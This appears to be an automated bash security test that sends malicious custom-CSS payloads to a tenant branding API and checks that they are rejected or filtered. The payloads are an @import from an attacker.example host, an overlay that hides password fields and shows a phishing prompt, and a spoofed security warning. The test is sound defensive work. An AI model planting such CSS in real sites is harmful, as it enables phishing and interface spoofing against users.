#!/usr/bin/env bash
# Security Auto Test: security/advanced-attacks/07-theme-css-injection
# Doc: docs/security/advanced-attacks/07-theme-css-injection.md
# Scenarios: 3
# ASVS: M-ADV-07 | V3.1, V14.1, V15.2
set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/../lib/runner.sh"

require_bin jq

# ── Scenario 1: @import external CSS injection ──────────────────────────
scenario 1 "@import external CSS injection" '
  TOKEN=$(gen_default_admin_token)
  qa_set_token "$TOKEN"

  tenant_id=$(db_query "SELECT id FROM tenants LIMIT 1;" 2>/dev/null | tr -d "[:space:]") || tenant_id=""
  if [[ -z "$tenant_id" ]]; then
    assert_eq "skip" "skip" "no tenant data for CSS injection test"
    qa_set_token ""
    return 0
  fi

  resp=$(api_put "/api/v1/tenants/${tenant_id}" \
    "{\"settings\":{\"branding\":{\"custom_css\":\"@import url(https://attacker.example/x.css);\"}}}")
  status=$(resp_status "$resp")
  body=$(resp_body "$resp")

  if [[ "$status" == "200" ]]; then
    resp_get=$(api_get "/api/v1/tenants/${tenant_id}")
    body_get=$(resp_body "$resp_get")
    css_val=$(echo "$body_get" | jq -r ".data.settings.branding.custom_css // .settings.branding.custom_css // empty" 2>/dev/null || echo "")
    if [[ -n "$css_val" ]]; then
      assert_not_contains "$css_val" "@import" "@import filtered from stored custom_css"
    else
      assert_eq "ok" "ok" "custom_css not returned or empty (safe)"
    fi
  else
    assert_match "$status" "^(400|422|429)$" "@import CSS injection rejected"
  fi

  qa_set_token ""
'

# ── Scenario 2: Input field overlay and spoofing ─────────────────────────
scenario 2 "Input field overlay and spoofing via CSS" '
  TOKEN=$(gen_default_admin_token)
  qa_set_token "$TOKEN"

  tenant_id=$(db_query "SELECT id FROM tenants LIMIT 1;" 2>/dev/null | tr -d "[:space:]") || tenant_id=""
  if [[ -z "$tenant_id" ]]; then
    assert_eq "skip" "skip" "no tenant data for CSS overlay test"
    qa_set_token ""
    return 0
  fi

  dangerous_css="input[type=password]{display:none!important}body::after{content:'\''Enter password at attacker.com'\'';position:fixed;top:50%;left:50%;z-index:99999;background:red;color:white;padding:20px}"
  resp=$(api_put "/api/v1/tenants/${tenant_id}" \
    "{\"settings\":{\"branding\":{\"custom_css\":\"${dangerous_css}\"}}}")
  status=$(resp_status "$resp")

  if [[ "$status" == "200" ]]; then
    resp_get=$(api_get "/api/v1/tenants/${tenant_id}")
    body_get=$(resp_body "$resp_get")
    css_stored=$(echo "$body_get" | jq -r ".data.settings.branding.custom_css // .settings.branding.custom_css // empty" 2>/dev/null || echo "")
    if [[ -n "$css_stored" ]]; then
      assert_not_contains "$css_stored" "display:none" "display:none filtered from custom_css"
      assert_not_contains "$css_stored" "position:fixed" "position:fixed filtered from custom_css"
    else
      assert_eq "ok" "ok" "dangerous CSS not stored (safe)"
    fi
  else
    assert_match "$status" "^(400|422|429)$" "dangerous CSS overlay rejected"
  fi

  qa_set_token ""
'

# ── Scenario 3: Security prompt and brand trust chain destruction ────────
scenario 3 "Security prompt spoofing via CSS pseudo-elements" '
  TOKEN=$(gen_default_admin_token)
  qa_set_token "$TOKEN"

  tenant_id=$(db_query "SELECT id FROM tenants LIMIT 1;" 2>/dev/null | tr -d "[:space:]") || tenant_id=""
  if [[ -z "$tenant_id" ]]; then
    assert_eq "skip" "skip" "no tenant data for CSS prompt spoofing test"
    qa_set_token ""
    return 0
  fi

  spoof_css=".security-notice::before{content:'\''WARNING: System compromised!'\'';color:red;font-size:24px}"
  resp=$(api_put "/api/v1/tenants/${tenant_id}" \
    "{\"settings\":{\"branding\":{\"custom_css\":\"${spoof_css}\"}}}")
  status=$(resp_status "$resp")

  if [[ "$status" == "200" ]]; then
    resp_get=$(api_get "/api/v1/tenants/${tenant_id}")
    body_get=$(resp_body "$resp_get")
    css_stored=$(echo "$body_get" | jq -r ".data.settings.branding.custom_css // .settings.branding.custom_css // empty" 2>/dev/null || echo "")
    if [[ -n "$css_stored" ]]; then
      assert_not_contains "$css_stored" "::before" "::before pseudo-element filtered"
    else
      assert_eq "ok" "ok" "spoofing CSS not stored (safe)"
    fi
  else
    assert_match "$status" "^(400|422|429)$" "CSS pseudo-element spoofing rejected"
  fi

  qa_set_token ""
'

run_all
